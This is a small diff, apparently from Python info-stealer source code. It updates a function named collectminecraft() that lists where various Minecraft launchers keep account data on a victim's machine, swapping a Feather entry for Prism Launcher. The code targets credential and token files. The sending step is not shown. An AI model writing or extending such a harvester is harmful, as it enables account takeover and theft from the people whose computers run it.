@@ -692,7 +692,7 @@ def collectminecraft():
         'Tlauncher': os.path.join(appdata, '.minecraft', 'TlauncherProfiles.json'),
         'Minecraft Launcher Old': os.path.join(appdata, '.minecraft', 'launcher_accounts.json'),
         'Minecraft Launcher': os.path.join(appdata, '.minecraft', 'launcher_accounts_microsoft_store.json'),
-        'Feather': os.path.join(appdata, '.feather', 'account.txt'),
+        'Prism Launcher': os.path.join(appdata, 'PrismLauncher', 'accounts.json'),
         'Lunar Client': os.path.join(userprofile, '.lunarclient', 'settings', 'game', 'accounts.json'),
         }
         for name, path in mcpaths.items():
